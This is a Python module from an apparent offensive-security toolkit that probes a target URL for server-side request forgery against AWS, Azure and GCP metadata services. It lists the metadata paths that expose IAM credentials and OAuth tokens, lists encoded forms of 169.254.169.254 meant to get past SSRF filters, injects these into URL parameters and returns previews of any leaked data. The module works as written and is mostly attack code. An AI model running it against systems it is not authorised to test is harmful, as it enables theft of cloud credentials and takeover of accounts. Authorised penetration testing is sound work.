"""Cloud metadata service exposure tester.

Tests for SSRF vulnerabilities targeting cloud metadata endpoints (169.254.169.254).
"""

import asyncio
import re
import json
from typing import Any
from urllib.parse import urlparse, urljoin, quote

import aiohttp

from src.core.base_module import (
    AtsModule,
    ModuleSpec,
    ModuleCategory,
    Parameter,
    ParameterType,
    OutputField,
)

METADATA_ENDPOINTS = {
    "aws": {
        "base": "http://169.254.169.254",
        "paths": [
            "/latest/meta-data/", "/latest/meta-data/iam/security-credentials/",
            "/latest/meta-data/hostname", "/latest/meta-data/local-ipv4",
            "/latest/meta-data/public-ipv4", "/latest/meta-data/ami-id",
            "/latest/meta-data/instance-id", "/latest/meta-data/instance-type",
            "/latest/user-data", "/latest/dynamic/instance-identity/document",
        ],
        "token_endpoint": "/latest/api/token",
    },
    "azure": {
        "base": "http://169.254.169.254",
        "paths": [
            "/metadata/instance?api-version=2021-02-01",
            "/metadata/instance/compute?api-version=2021-02-01",
            "/metadata/instance/network?api-version=2021-02-01",
            "/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        ],
        "headers": {"Metadata": "true"},
    },
    "gcp": {
        "base": "http://metadata.google.internal",
        "paths": [
            "/computeMetadata/v1/project/project-id",
            "/computeMetadata/v1/instance/hostname",
            "/computeMetadata/v1/instance/zone",
            "/computeMetadata/v1/instance/service-accounts/default/token",
            "/computeMetadata/v1/instance/service-accounts/default/email",
            "/computeMetadata/v1/project/attributes/",
        ],
        "headers": {"Metadata-Flavor": "Google"},
    },
}

SSRF_BYPASS_PAYLOADS = [
    "http://169.254.169.254",
    "http://[::ffff:a9fe:a9fe]",
    "http://0xa9fea9fe",
    "http://169.254.169.254.nip.io",
    "http://2852039166",
    "http://0251.0376.0251.0376",
    "http://0xA9.0xFE.0xA9.0xFE",
]


class CloudMetadataExploitModule(AtsModule):
    """Test cloud metadata service exposure via SSRF vectors."""

    def get_spec(self) -> ModuleSpec:
        return ModuleSpec(
            name="cloud_metadata_exploit",
            category=ModuleCategory.ADVANCED,
            description="Test for cloud metadata service exposure via SSRF vulnerabilities",
            version="1.0.0",
            parameters=[
                Parameter(name="target", type=ParameterType.URL,
                          description="Target URL to test for SSRF", required=True),
                Parameter(name="cloud_provider", type=ParameterType.CHOICE,
                          description="Cloud provider to target",
                          choices=["aws", "azure", "gcp", "auto"], default="auto"),
                Parameter(name="test_bypasses", type=ParameterType.BOOLEAN,
                          description="Test SSRF filter bypass techniques", default=True),
            ],
            outputs=[
                OutputField(name="vulnerable", type="boolean", description="Whether SSRF to metadata was possible"),
                OutputField(name="exposed_data", type="list", description="Data retrieved from metadata"),
                OutputField(name="bypass_results", type="list", description="SSRF bypass test results"),
            ],
            tags=["advanced", "cloud", "ssrf", "metadata", "exploit"],
            author="ATS-Toolkit",
            dangerous=True,
        )

    def validate_inputs(self, config: dict[str, Any]) -> tuple[bool, str]:
        target = config.get("target", "").strip()
        if not target:
            return False, "Target URL is required"
        parsed = urlparse(target)
        if not parsed.scheme or not parsed.netloc:
            return False, "Invalid URL format - must include scheme and host"
        return True, ""

    def _build_ssrf_url(self, target: str, metadata_url: str) -> list[str]:
        """Build SSRF test URLs using common parameter injection points."""
        parsed = urlparse(target)
        test_urls = []
        encoded = quote(metadata_url, safe="")

        if "=" in parsed.query:
            base = target.rsplit("=", 1)[0]
            test_urls.append(f"{base}={metadata_url}")
            test_urls.append(f"{base}={encoded}")
        else:
            test_urls.append(f"{target}?url={metadata_url}")
            test_urls.append(f"{target}?redirect={metadata_url}")
            test_urls.append(f"{target}?path={encoded}")
            test_urls.append(f"{target}?file={metadata_url}")

        return test_urls

    async def _test_ssrf_endpoint(self, session: aiohttp.ClientSession, url: str,
                                   expected_headers: dict | None = None) -> dict[str, Any]:
        """Test a single SSRF URL for metadata exposure."""
        result = {"url": url, "accessible": False, "status": None, "data_leaked": False}
        try:
            headers = {"User-Agent": "Mozilla/5.0"}
            if expected_headers:
                headers.update(expected_headers)
            async with session.get(url, timeout=aiohttp.ClientTimeout(total=10),
                                   allow_redirects=False) as resp:
                result["status"] = resp.status
                if resp.status == 200:
                    body = await resp.text()
                    metadata_indicators = [
                        "ami-id", "instance-id", "local-ipv4", "security-credentials",
                        "computeMetadata", "instance/compute", "access_token",
                        "iam/security", "meta-data", "accountId", "availabilityZone",
                    ]
                    for indicator in metadata_indicators:
                        if indicator in body:
                            result["accessible"] = True
                            result["data_leaked"] = True
                            result["leaked_indicator"] = indicator
                            result["response_preview"] = body[:300]
                            break
        except (aiohttp.ClientError, asyncio.TimeoutError):
            result["error"] = "Connection failed or timeout"
        return result

    async def _detect_provider(self, session: aiohttp.ClientSession,
                                target: str) -> str:
        """Attempt to detect cloud provider from response headers."""
        try:
            async with session.get(target, timeout=aiohttp.ClientTimeout(total=8)) as resp:
                headers_str = str(dict(resp.headers)).lower()
                if "x-amz" in headers_str or "aws" in headers_str:
                    return "aws"
                if "x-ms" in headers_str or "azure" in headers_str:
                    return "azure"
                if "x-goog" in headers_str or "gfe" in headers_str:
                    return "gcp"
        except (aiohttp.ClientError, asyncio.TimeoutError):
            pass
        return "aws"

    async def execute(self, config: dict[str, Any]) -> dict[str, Any]:
        target = config["target"].strip()
        provider = config.get("cloud_provider", "auto")
        test_bypasses = config.get("test_bypasses", True)

        connector = aiohttp.TCPConnector(limit=5, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            if provider == "auto":
                provider = await self._detect_provider(session, target)

            endpoints = METADATA_ENDPOINTS.get(provider, METADATA_ENDPOINTS["aws"])
            base_url = endpoints["base"]
            paths = endpoints["paths"]
            extra_headers = endpoints.get("headers")

            all_results = []
            exposed_data = []

            for path in paths:
                metadata_url = f"{base_url}{path}"
                ssrf_urls = self._build_ssrf_url(target, metadata_url)
                for test_url in ssrf_urls[:2]:
                    result = await self._test_ssrf_endpoint(session, test_url, extra_headers)
                    if result["data_leaked"]:
                        exposed_data.append({
                            "path": path, "indicator": result.get("leaked_indicator"),
                            "preview": result.get("response_preview", ""),
                        })
                    all_results.append(result)

            bypass_results = []
            if test_bypasses:
                for bypass_base in SSRF_BYPASS_PAYLOADS:
                    bypass_url = f"{bypass_base}/latest/meta-data/"
                    ssrf_urls = self._build_ssrf_url(target, bypass_url)
                    for test_url in ssrf_urls[:1]:
                        res = await self._test_ssrf_endpoint(session, test_url, extra_headers)
                        bypass_results.append({
                            "bypass_payload": bypass_base,
                            "success": res.get("data_leaked", False),
                            "status": res.get("status"),
                        })

        vulnerable = len(exposed_data) > 0
        return {
            "target": target,
            "cloud_provider": provider,
            "vulnerable": vulnerable,
            "exposed_data": exposed_data,
            "total_tests": len(all_results),
            "bypass_results": bypass_results,
            "risk_level": "critical" if vulnerable else "info",
        }
